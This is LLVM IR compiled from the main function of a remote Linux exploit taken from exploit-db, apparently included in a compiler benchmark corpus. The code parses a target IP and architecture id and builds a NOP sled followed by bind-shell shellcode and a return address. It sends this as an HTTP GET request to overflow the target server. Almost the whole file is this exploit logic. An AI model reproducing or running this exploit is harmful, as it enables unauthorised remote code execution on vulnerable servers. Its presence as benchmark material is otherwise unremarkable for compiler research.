; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_21937.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_21937.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_4__ = type { i32, i64, i32, i8* }
%struct.sockaddr_in = type { i32, %struct.TYPE_3__, i32, i32 }
%struct.TYPE_3__ = type { i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [5 x i8] c"b:d:\00", align 1
@optarg = external dso_local global i8*, align 8
@optind = external dso_local global i32, align 4
@ARCH_NUMBER = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [26 x i8] c"Invalid architecture id.\0A\00", align 1
@.str.2 = private unnamed_addr constant [32 x i8] c"\22%s\22 is an invalid ip address.\0A\00", align 1
@MIN_BUFFER_SIZE = common dso_local global i32 0, align 4
@architectures = common dso_local global %struct.TYPE_4__* null, align 8
@NOP = common dso_local global i32 0, align 4
@bindshell = common dso_local global i8* null, align 8
@.str.3 = private unnamed_addr constant [9 x i8] c"GET %s\0A\0A\00", align 1
@.str.4 = private unnamed_addr constant [12 x i8] c"target: %s\0A\00", align 1
@.str.5 = private unnamed_addr constant [23 x i8] c"arch id: %d, %s, 0x%x\0A\00", align 1
@.str.6 = private unnamed_addr constant [19 x i8] c"ip size: %d bytes\0A\00", align 1
@.str.7 = private unnamed_addr constant [18 x i8] c"Adjust: %d bytes\0A\00", align 1
@.str.8 = private unnamed_addr constant [23 x i8] c"buffer size: %d bytes\0A\00", align 1
@.str.9 = private unnamed_addr constant [31 x i8] c"bind shellcode size: %d bytes\0A\00", align 1
@.str.10 = private unnamed_addr constant [25 x i8] c"bind shell tcp port: %d\0A\00", align 1
@BIND_PORT = common dso_local global i32 0, align 4
@.str.11 = private unnamed_addr constant [27 x i8] c"Injecting code at 0x%x...\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.12 = private unnamed_addr constant [17 x i8] c"socket() error.\0A\00", align 1
@GAZTEK_PORT = common dso_local global i32 0, align 4
@.str.13 = private unnamed_addr constant [18 x i8] c"connect() error.\0A\00", align 1
@.str.14 = private unnamed_addr constant [16 x i8] c"write() error.\0A\00", align 1
@.str.15 = private unnamed_addr constant [7 x i8] c"Done!\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i64, align 8
  %18 = alloca %struct.sockaddr_in, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  store i32 0, i32* %13, align 4
  %19 = load i32, i32* %4, align 4
  %20 = icmp eq i32 %19, 1
  br i1 %20, label %21, label %24

21:                                               ; preds = %2
  %22 = load i8**, i8*** %5, align 8
  %23 = call i32 @synops(i8** %22)
  br label %24

24:                                               ; preds = %21, %2
  br label %25

25:                                               ; preds = %129, %24
  %26 = load i32, i32* %4, align 4
  %27 = load i8**, i8*** %5, align 8
  %28 = call i32 @getopt(i32 %26, i8** %27, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0))
  store i32 %28, i32* %6, align 4
  %29 = icmp ne i32 %28, -1
  br i1 %29, label %30, label %130

30:                                               ; preds = %25
  %31 = load i32, i32* %6, align 4
  switch i32 %31, label %129 [
    i32 98, label %32
    i32 100, label %41
    i32 58, label %123
    i32 63, label %126
  ]

32:                                               ; preds = %30
  %33 = load i8*, i8** @optarg, align 8
  %34 = call i32 @strlen(i8* %33)
  %35 = call i8* @malloc(i32 %34)
  store i8* %35, i8** %14, align 8
  %36 = load i8*, i8** %14, align 8
  %37 = load i8*, i8** @optarg, align 8
  %38 = call i32 @strcpy(i8* %36, i8* %37)
  %39 = load i32, i32* %12, align 4
  %40 = add nsw i32 %39, 1
  store i32 %40, i32* %12, align 4
  br label %129

41:                                               ; preds = %30
  %42 = load i8**, i8*** %5, align 8
  %43 = load i32, i32* @optind, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds i8*, i8** %42, i64 %44
  %46 = load i8*, i8** %45, align 8
  %47 = icmp ne i8* %46, null
  br i1 %47, label %51, label %48

48:                                               ; preds = %41
  %49 = load i32, i32* %11, align 4
  %50 = add nsw i32 %49, 1
  store i32 %50, i32* %11, align 4
  br label %51

51:                                               ; preds = %48, %41
  %52 = load i8**, i8*** %5, align 8
  %53 = load i32, i32* @optind, align 4
  %54 = add nsw i32 %53, 1
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds i8*, i8** %52, i64 %55
  %57 = load i8*, i8** %56, align 8
  %58 = icmp ne i8* %57, null
  br i1 %58, label %62, label %59

59:                                               ; preds = %51
  %60 = load i32, i32* %11, align 4
  %61 = add nsw i32 %60, 1
  store i32 %61, i32* %11, align 4
  br label %62

62:                                               ; preds = %59, %51
  %63 = load i32, i32* %11, align 4
  %64 = icmp eq i32 %63, 0
  br i1 %64, label %65, label %122

65:                                               ; preds = %62
  %66 = load i8*, i8** @optarg, align 8
  %67 = call i32 @atoi(i8* %66)
  store i32 %67, i32* %9, align 4
  %68 = icmp slt i32 %67, 0
  br i1 %68, label %75, label %69

69:                                               ; preds = %65
  %70 = load i8*, i8** @optarg, align 8
  %71 = call i32 @atoi(i8* %70)
  store i32 %71, i32* %9, align 4
  %72 = load i32, i32* @ARCH_NUMBER, align 4
  %73 = sub nsw i32 %72, 1
  %74 = icmp sgt i32 %71, %73
  br i1 %74, label %75, label %78

75:                                               ; preds = %69, %65
  %76 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.1, i64 0, i64 0))
  %77 = call i32 @exit(i32 -1) #3
  unreachable

78:                                               ; preds = %69
  %79 = load i8**, i8*** %5, align 8
  %80 = load i32, i32* @optind, align 4
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds i8*, i8** %79, i64 %81
  %83 = load i8*, i8** %82, align 8
  %84 = call i32 @inet_addr(i8* %83)
  %85 = icmp ne i32 %84, -1
  br i1 %85, label %86, label %94

86:                                               ; preds = %78
  %87 = load i8**, i8*** %5, align 8
  %88 = load i32, i32* @optind, align 4
  %89 = add nsw i32 %88, 1
  %90 = sext i32 %89 to i64
  %91 = getelementptr inbounds i8*, i8** %87, i64 %90
  %92 = load i8*, i8** %91, align 8
  %93 = call i32 @strlen(i8* %92)
  store i32 %93, i32* %8, align 4
  br label %102

94:                                               ; preds = %78
  %95 = load i8**, i8*** %5, align 8
  %96 = load i32, i32* @optind, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds i8*, i8** %95, i64 %97
  %99 = load i8*, i8** %98, align 8
  %100 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.2, i64 0, i64 0), i8* %99)
  %101 = call i32 @exit(i32 -1) #3
  unreachable

102:                                              ; preds = %86
  %103 = load i8**, i8*** %5, align 8
  %104 = load i32, i32* @optind, align 4
  %105 = add nsw i32 %104, 1
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds i8*, i8** %103, i64 %106
  %108 = load i8*, i8** %107, align 8
  %109 = call i32 @strlen(i8* %108)
  %110 = call i8* @malloc(i32 %109)
  store i8* %110, i8** %14, align 8
  %111 = load i8*, i8** %14, align 8
  %112 = load i8**, i8*** %5, align 8
  %113 = load i32, i32* @optind, align 4
  %114 = add nsw i32 %113, 1
  %115 = sext i32 %114 to i64
  %116 = getelementptr inbounds i8*, i8** %112, i64 %115
  %117 = load i8*, i8** %116, align 8
  %118 = getelementptr inbounds i8, i8* %117, i64 1
  %119 = call i32 @strcpy(i8* %111, i8* %118)
  %120 = load i32, i32* %13, align 4
  %121 = add nsw i32 %120, 1
  store i32 %121, i32* %13, align 4
  br label %122

122:                                              ; preds = %102, %62
  br label %129

123:                                              ; preds = %30
  %124 = load i32, i32* %11, align 4
  %125 = add nsw i32 %124, 1
  store i32 %125, i32* %11, align 4
  br label %129

126:                                              ; preds = %30
  %127 = load i32, i32* %11, align 4
  %128 = add nsw i32 %127, 1
  store i32 %128, i32* %11, align 4
  br label %129

129:                                              ; preds = %126, %30, %123, %122, %32
  br label %25

130:                                              ; preds = %25
  %131 = load i32, i32* %11, align 4
  %132 = icmp sgt i32 %131, 0
  br i1 %132, label %133, label %136

133:                                              ; preds = %130
  %134 = load i8**, i8*** %5, align 8
  %135 = call i32 @synops(i8** %134)
  br label %136

136:                                              ; preds = %133, %130
  %137 = load i32, i32* %12, align 4
  %138 = icmp sgt i32 %137, 0
  br i1 %138, label %139, label %142

139:                                              ; preds = %136
  %140 = load i8*, i8** %14, align 8
  %141 = call i32 @get_ban(i8* %140)
  br label %142

142:                                              ; preds = %139, %136
  %143 = load i32, i32* %13, align 4
  %144 = icmp ne i32 %143, 0
  br i1 %144, label %148, label %145

145:                                              ; preds = %142
  %146 = load i8**, i8*** %5, align 8
  %147 = call i32 @synops(i8** %146)
  br label %148

148:                                              ; preds = %145, %142
  %149 = load i32, i32* @MIN_BUFFER_SIZE, align 4
  %150 = add nsw i32 %149, 15
  %151 = load i32, i32* %8, align 4
  %152 = sub nsw i32 %150, %151
  %153 = sub nsw i32 %152, 4
  %154 = sub nsw i32 %153, 2
  %155 = load %struct.TYPE_4__*, %struct.TYPE_4__** @architectures, align 8
  %156 = load i32, i32* %9, align 4
  %157 = sext i32 %156 to i64
  %158 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %155, i64 %157
  %159 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %158, i32 0, i32 0
  %160 = load i32, i32* %159, align 8
  %161 = add nsw i32 %154, %160
  store i32 %161, i32* %7, align 4
  %162 = load i32, i32* %7, align 4
  %163 = add nsw i32 %162, 1
  store i32 %163, i32* %7, align 4
  %164 = load i32, i32* %7, align 4
  %165 = call i8* @malloc(i32 %164)
  store i8* %165, i8** %15, align 8
  %166 = load i32, i32* %7, align 4
  %167 = add nsw i32 %166, 4
  %168 = add nsw i32 %167, 2
  %169 = call i8* @malloc(i32 %168)
  store i8* %169, i8** %16, align 8
  %170 = load i8*, i8** %15, align 8
  %171 = load i32, i32* @NOP, align 4
  %172 = load i32, i32* %7, align 4
  %173 = call i32 @memset(i8* %170, i32 %171, i32 %172)
  %174 = load i8*, i8** %15, align 8
  %175 = load i32, i32* %7, align 4
  %176 = sub nsw i32 %175, 1
  %177 = sub nsw i32 %176, 4
  %178 = load i8*, i8** @bindshell, align 8
  %179 = call i32 @strlen(i8* %178)
  %180 = sub nsw i32 %177, %179
  %181 = sext i32 %180 to i64
  %182 = getelementptr inbounds i8, i8* %174, i64 %181
  %183 = load i8*, i8** @bindshell, align 8
  %184 = load i8*, i8** @bindshell, align 8
  %185 = call i32 @strlen(i8* %184)
  %186 = call i32 @memcpy(i8* %182, i8* %183, i32 %185)
  %187 = load %struct.TYPE_4__*, %struct.TYPE_4__** @architectures, align 8
  %188 = load i32, i32* %9, align 4
  %189 = sext i32 %188 to i64
  %190 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %187, i64 %189
  %191 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %190, i32 0, i32 1
  %192 = load i64, i64* %191, align 8
  %193 = load i8*, i8** %15, align 8
  %194 = load i32, i32* %7, align 4
  %195 = sub nsw i32 %194, 4
  %196 = sub nsw i32 %195, 1
  %197 = sext i32 %196 to i64
  %198 = getelementptr inbounds i8, i8* %193, i64 %197
  %199 = bitcast i8* %198 to i64*
  store i64 %192, i64* %199, align 8
  %200 = load i8*, i8** %15, align 8
  %201 = load i32, i32* %7, align 4
  %202 = sub nsw i32 %201, 1
  %203 = sext i32 %202 to i64
  %204 = getelementptr inbounds i8, i8* %200, i64 %203
  store i8 0, i8* %204, align 1
  %205 = load i8*, i8** %16, align 8
  %206 = load i8*, i8** %15, align 8
  %207 = call i32 @sprintf(i8* %205, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.3, i64 0, i64 0), i8* %206)
  %208 = load i8*, i8** %14, align 8
  %209 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.4, i64 0, i64 0), i8* %208)
  %210 = load %struct.TYPE_4__*, %struct.TYPE_4__** @architectures, align 8
  %211 = load i32, i32* %9, align 4
  %212 = sext i32 %211 to i64
  %213 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %210, i64 %212
  %214 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %213, i32 0, i32 2
  %215 = load i32, i32* %214, align 8
  %216 = load %struct.TYPE_4__*, %struct.TYPE_4__** @architectures, align 8
  %217 = load i32, i32* %9, align 4
  %218 = sext i32 %217 to i64
  %219 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %216, i64 %218
  %220 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %219, i32 0, i32 3
  %221 = load i8*, i8** %220, align 8
  %222 = load %struct.TYPE_4__*, %struct.TYPE_4__** @architectures, align 8
  %223 = load i32, i32* %9, align 4
  %224 = sext i32 %223 to i64
  %225 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %222, i64 %224
  %226 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %225, i32 0, i32 1
  %227 = load i64, i64* %226, align 8
  %228 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.5, i64 0, i64 0), i32 %215, i8* %221, i64 %227)
  %229 = load i32, i32* %8, align 4
  %230 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.6, i64 0, i64 0), i32 %229)
  %231 = load %struct.TYPE_4__*, %struct.TYPE_4__** @architectures, align 8
  %232 = load i32, i32* %9, align 4
  %233 = sext i32 %232 to i64
  %234 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %231, i64 %233
  %235 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %234, i32 0, i32 0
  %236 = load i32, i32* %235, align 8
  %237 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.7, i64 0, i64 0), i32 %236)
  %238 = load i8*, i8** %16, align 8
  %239 = call i32 @strlen(i8* %238)
  %240 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.8, i64 0, i64 0), i32 %239)
  %241 = load i8*, i8** @bindshell, align 8
  %242 = call i32 @strlen(i8* %241)
  %243 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.9, i64 0, i64 0), i32 %242)
  %244 = load i32, i32* @BIND_PORT, align 4
  %245 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.10, i64 0, i64 0), i32 %244)
  %246 = load %struct.TYPE_4__*, %struct.TYPE_4__** @architectures, align 8
  %247 = load i32, i32* %9, align 4
  %248 = sext i32 %247 to i64
  %249 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %246, i64 %248
  %250 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %249, i32 0, i32 1
  %251 = load i64, i64* %250, align 8
  %252 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.11, i64 0, i64 0), i64 %251)
  %253 = load i32, i32* @AF_INET, align 4
  %254 = load i32, i32* @SOCK_STREAM, align 4
  %255 = call i32 @socket(i32 %253, i32 %254, i32 0)
  store i32 %255, i32* %10, align 4
  %256 = icmp slt i32 %255, 1
  br i1 %256, label %257, label %260

257:                                              ; preds = %148
  %258 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.12, i64 0, i64 0))
  %259 = call i32 @exit(i32 -1) #3
  unreachable

260:                                              ; preds = %148
  %261 = load i32, i32* @AF_INET, align 4
  %262 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  store i32 %261, i32* %262, align 4
  %263 = load i32, i32* @GAZTEK_PORT, align 4
  %264 = call i32 @htons(i32 %263)
  %265 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  store i32 %264, i32* %265, align 4
  %266 = load i8*, i8** %14, align 8
  %267 = call i32 @inet_addr(i8* %266)
  %268 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  %269 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %268, i32 0, i32 0
  store i32 %267, i32* %269, align 4
  %270 = icmp eq i32 %267, -1
  br i1 %270, label %271, label %275

271:                                              ; preds = %260
  %272 = load i8*, i8** %14, align 8
  %273 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.2, i64 0, i64 0), i8* %272)
  %274 = call i32 @exit(i32 -1) #3
  unreachable

275:                                              ; preds = %260
  %276 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  %277 = call i32 @bzero(i32* %276, i32 8)
  %278 = load i32, i32* %10, align 4
  %279 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  %280 = call i32 @connect(i32 %278, %struct.sockaddr* %279, i32 16)
  %281 = icmp eq i32 %280, -1
  br i1 %281, label %282, label %285

282:                                              ; preds = %275
  %283 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.13, i64 0, i64 0))
  %284 = call i32 @exit(i32 -1) #3
  unreachable

285:                                              ; preds = %275
  %286 = load i32, i32* %10, align 4
  %287 = load i8*, i8** %16, align 8
  %288 = load i8*, i8** %16, align 8
  %289 = call i32 @strlen(i8* %288)
  %290 = call i32 @write(i32 %286, i8* %287, i32 %289)
  %291 = icmp eq i32 %290, -1
  br i1 %291, label %292, label %295

292:                                              ; preds = %285
  %293 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.14, i64 0, i64 0))
  %294 = call i32 @exit(i32 -1) #3
  unreachable

295:                                              ; preds = %285
  %296 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.15, i64 0, i64 0))
  ret i32 0
}

declare dso_local i32 @synops(i8**) #1

declare dso_local i32 @getopt(i32, i8**, i8*) #1

declare dso_local i8* @malloc(i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @strcpy(i8*, i8*) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local i32 @get_ban(i8*) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @sprintf(i8*, i8*, i8*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @bzero(i32*, i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @write(i32, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
